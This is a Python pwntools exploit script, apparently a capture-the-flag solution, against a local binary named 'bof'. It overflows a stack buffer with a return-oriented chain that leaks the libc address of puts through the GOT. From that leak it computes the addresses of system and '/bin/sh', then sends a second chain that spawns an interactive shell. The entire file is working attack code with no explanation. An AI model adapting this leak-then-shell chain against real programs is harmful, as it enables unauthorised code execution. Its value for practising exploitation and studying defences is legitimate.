from pwn import *

r = process("./bof")
pause()

VULN = 0x0000000000400537

RET = 0x000000000040028a
PUTS = 0x0000000000400430
POP_RDI_RET = 0x00000000004005e3
PUTS_GOT = 0x601018

PUTS_OFFSET = 0x809c0
SYSTEM_OFFSET = 0x4f440
BINSH_OFFSET = 0x1b3e9a

PAYLOAD = b"A" * 40
PAYLOAD += p64(POP_RDI_RET)
PAYLOAD += p64(PUTS_GOT)
PAYLOAD += p64(PUTS)
PAYLOAD += p64(VULN)

r.sendline(PAYLOAD)

r.recvline()
PUTS_LIBC = u64(r.recvline()[:-1].ljust(8, b"\x00"))
info("PUTS@LIBC:" + hex(PUTS_LIBC))
LIBC_BASE = PUTS_LIBC - PUTS_OFFSET
info("LIBC_BASE: " + hex(LIBC_BASE))
SYSTEM_LIBC = LIBC_BASE + SYSTEM_OFFSET
info("SYSTEM@LIBC: " + hex(SYSTEM_LIBC))
BINSH_LIBC = LIBC_BASE + BINSH_OFFSET
info("BINSH@LIBC: " + hex(BINSH_LIBC))

pause()

PAYLOAD2 = b"A" * 40
PAYLOAD2 += p64(RET)
PAYLOAD2 += p64(POP_RDI_RET)
PAYLOAD2 += p64(BINSH_LIBC)
PAYLOAD2 += p64(SYSTEM_LIBC)

r.sendline(PAYLOAD2)

r.interactive()
